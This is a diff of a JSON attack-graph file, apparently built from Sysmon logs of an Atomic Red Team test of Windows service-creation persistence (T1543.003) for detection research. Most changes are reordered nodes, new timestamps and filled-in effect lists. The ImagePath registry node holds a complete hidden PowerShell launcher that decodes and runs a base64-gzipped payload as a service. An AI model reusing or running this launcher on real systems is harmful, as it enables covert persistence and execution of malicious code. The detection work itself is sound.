@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1543.003",
-  "generated_at_utc": "2026-05-08T15:46:38.793603+00:00",
+  "generated_at_utc": "2026-05-08T16:37:51.465108+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1543.003\\atomic_red_team\\remote_service_create_windows-sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1543.003\\atomic_red_team\\remote_service_create_windows-sysmon.log",
@@ -67,7 +67,10 @@
       "<loopback_ip>",
       "%system32%\\cmd.exe"
     ],
-    "core_effect": [],
+    "core_effect": [
+      "qbzgludy",
+      "discovercachedata.dat"
+    ],
     "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1543.003_malcious_config.json"
   },
   "matching": {
@@ -81,7 +84,17 @@
       "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
       "Registry:cbb68ac061911ce5642b2ef4ff5d018cc4bf1c3994530f3427de1b03edf76935:13"
     ],
-    "core_effect_node_ids": [],
+    "core_effect_node_ids": [
+      "File:c83e05d498ef9bc9b59328cc77c640d2b60c74f0cf68e83c5caba6b3e710a46f:23",
+      "Registry:4d42c36c6721eed5dbe29c74ad8f4cdb2b16fc554578f38304bcd1a51638e88e:12",
+      "Registry:5b366b12373d4fea77869182857245531cbeab1835db9b7f4023d7a87ce7a62d:13",
+      "Registry:7300cf1daeb39b603fc34b9fc01b085d7467748968f724874021528c026b7259:13",
+      "Registry:871db654a14d3ed66e4b294670799fd525c15c790c7d76530b814821db36c5a7:13",
+      "Registry:979f720fd060b34c4c292eaa3d554e3708c46e0ff8dde14fc73d1f539c0f9dad:13",
+      "Registry:a6cc6cb92c224b83749471449bb1bef4fdd781e432c25cce5fe6161a1ca419a8:13",
+      "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
+      "Registry:cbb68ac061911ce5642b2ef4ff5d018cc4bf1c3994530f3427de1b03edf76935:13"
+    ],
     "whitelist_node_ids": [
       "File:0128be4bd356968ac6f1b8012fff1cb12b7e60936f24ee213675989fd4b6ef2c:11",
       "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
@@ -541,22 +554,22 @@
   },
   "nodes": [
     {
-      "id": "Registry:5b366b12373d4fea77869182857245531cbeab1835db9b7f4023d7a87ce7a62d:13",
-      "label": "Start",
+      "id": "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
+      "label": "Type",
       "type": "registry",
       "group": "Registry",
       "properties": {
         "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
-        "value_name": "Start",
-        "value_data": "DWORD (0x00000003)",
+        "value_name": "Type",
+        "value_data": "DWORD (0x00000010)",
         "source_image_path": "%system32%\\services.exe",
         "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
         "event_id": "13",
-        "id": "Registry:5b366b12373d4fea77869182857245531cbeab1835db9b7f4023d7a87ce7a62d:13",
+        "id": "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "Start",
-        "name": "Start"
+        "display_name": "Type",
+        "name": "Type"
       }
     },
     {
@@ -584,6 +597,25 @@
       }
     },
     {
+      "id": "Registry:5b366b12373d4fea77869182857245531cbeab1835db9b7f4023d7a87ce7a62d:13",
+      "label": "Start",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
+        "value_name": "Start",
+        "value_data": "DWORD (0x00000003)",
+        "source_image_path": "%system32%\\services.exe",
+        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
+        "event_id": "13",
+        "id": "Registry:5b366b12373d4fea77869182857245531cbeab1835db9b7f4023d7a87ce7a62d:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Start",
+        "name": "Start"
+      }
+    },
+    {
       "id": "Registry:a6cc6cb92c224b83749471449bb1bef4fdd781e432c25cce5fe6161a1ca419a8:13",
       "label": "DisplayName",
       "type": "registry",
@@ -600,57 +632,6 @@
         "entity_class": "RegistryEntity",
         "display_name": "DisplayName",
         "name": "DisplayName"
-      }
-    },
-    {
-      "id": "Registry:979f720fd060b34c4c292eaa3d554e3708c46e0ff8dde14fc73d1f539c0f9dad:13",
-      "label": "ErrorControl",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
-        "value_name": "ErrorControl",
-        "value_data": "DWORD (0x00000000)",
-        "source_image_path": "%system32%\\services.exe",
-        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
-        "event_id": "13",
-        "id": "Registry:979f720fd060b34c4c292eaa3d554e3708c46e0ff8dde14fc73d1f539c0f9dad:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "ErrorControl",
-        "name": "ErrorControl"
-      }
-    },
-    {
-      "id": "Technique:T1543_003",
-      "label": "T1543.003",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1543_003",
-        "name": "T1543.003",
-        "display_name": "T1543.003",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "Registry:4d42c36c6721eed5dbe29c74ad8f4cdb2b16fc554578f38304bcd1a51638e88e:12",
-      "label": "qBZGLudy",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES",
-        "value_name": "qBZGLudy",
-        "value_data": "DeleteKey",
-        "source_image_path": "%system32%\\services.exe",
-        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
-        "event_id": "12",
-        "id": "Registry:4d42c36c6721eed5dbe29c74ad8f4cdb2b16fc554578f38304bcd1a51638e88e:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "qBZGLudy",
-        "name": "qBZGLudy"
       }
     },
     {
@@ -673,6 +654,44 @@
       }
     },
     {
+      "id": "Registry:871db654a14d3ed66e4b294670799fd525c15c790c7d76530b814821db36c5a7:13",
+      "label": "ImagePath",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
+        "value_name": "ImagePath",
+        "value_data": "%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+        "source_image_path": "%system32%\\services.exe",
+        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
+        "event_id": "13",
+        "id": "Registry:871db654a14d3ed66e4b294670799fd525c15c790c7d76530b814821db36c5a7:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "ImagePath",
+        "name": "ImagePath"
+      }
+    },
+    {
+      "id": "Registry:979f720fd060b34c4c292eaa3d554e3708c46e0ff8dde14fc73d1f539c0f9dad:13",
+      "label": "ErrorControl",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
+        "value_name": "ErrorControl",
+        "value_data": "DWORD (0x00000000)",
+        "source_image_path": "%system32%\\services.exe",
+        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
+        "event_id": "13",
+        "id": "Registry:979f720fd060b34c4c292eaa3d554e3708c46e0ff8dde14fc73d1f539c0f9dad:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "ErrorControl",
+        "name": "ErrorControl"
+      }
+    },
+    {
       "id": "Registry:cbb68ac061911ce5642b2ef4ff5d018cc4bf1c3994530f3427de1b03edf76935:13",
       "label": "DeleteFlag",
       "type": "registry",
@@ -692,41 +711,35 @@
       }
     },
     {
-      "id": "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
-      "label": "Type",
+      "id": "Registry:4d42c36c6721eed5dbe29c74ad8f4cdb2b16fc554578f38304bcd1a51638e88e:12",
+      "label": "qBZGLudy",
       "type": "registry",
       "group": "Registry",
       "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
-        "value_name": "Type",
-        "value_data": "DWORD (0x00000010)",
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES",
+        "value_name": "qBZGLudy",
+        "value_data": "DeleteKey",
         "source_image_path": "%system32%\\services.exe",
         "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
-        "event_id": "13",
-        "id": "Registry:c95b5b5595ed185e72474ce6a0e638aec6c6ea5d7d682b0d73f64debd0945352:13",
+        "event_id": "12",
+        "id": "Registry:4d42c36c6721eed5dbe29c74ad8f4cdb2b16fc554578f38304bcd1a51638e88e:12",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "Type",
-        "name": "Type"
+        "display_name": "qBZGLudy",
+        "name": "qBZGLudy"
       }
     },
     {
-      "id": "Registry:871db654a14d3ed66e4b294670799fd525c15c790c7d76530b814821db36c5a7:13",
-      "label": "ImagePath",
-      "type": "registry",
-      "group": "Registry",
+      "id": "Technique:T1543_003",
+      "label": "T1543.003",
+      "type": "technique",
+      "group": "Technique",
       "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\QBZGLUDY",
-        "value_name": "ImagePath",
-        "value_data": "%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
-        "source_image_path": "%system32%\\services.exe",
-        "parent_process_id": "Process:{B81B27B7-28B1-6193-0A00-00000000CC01}:1",
-        "event_id": "13",
-        "id": "Registry:871db654a14d3ed66e4b294670799fd525c15c790c7d76530b814821db36c5a7:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "ImagePath",
-        "name": "ImagePath"
+        "id": "Technique:T1543_003",
+        "name": "T1543.003",
+        "display_name": "T1543.003",
+        "type": "Technique",
+        "entity_class": "Technique"
       }
     }
   ],
@@ -742,7 +755,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -756,7 +769,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -770,7 +783,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -784,7 +797,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -798,7 +811,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -812,7 +825,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -826,7 +839,7 @@
       "properties": {
         "action": "Registry Object Create/Delete",
         "event_id": "12",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -840,7 +853,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T15:46:38.712324+00:00"
+        "timestamp": "2026-05-08T16:37:51.369647+00:00"
       }
     },
     {
@@ -865,7 +878,7 @@
     "attack_edges": 9,
     "roots": 1,
     "matched_malicious_nodes": 8,
-    "core_effect_nodes": 0,
+    "core_effect_nodes": 9,
     "matched_whitelist_nodes": 450,
     "matched_overlap_whitelist_override_nodes": 2
   }
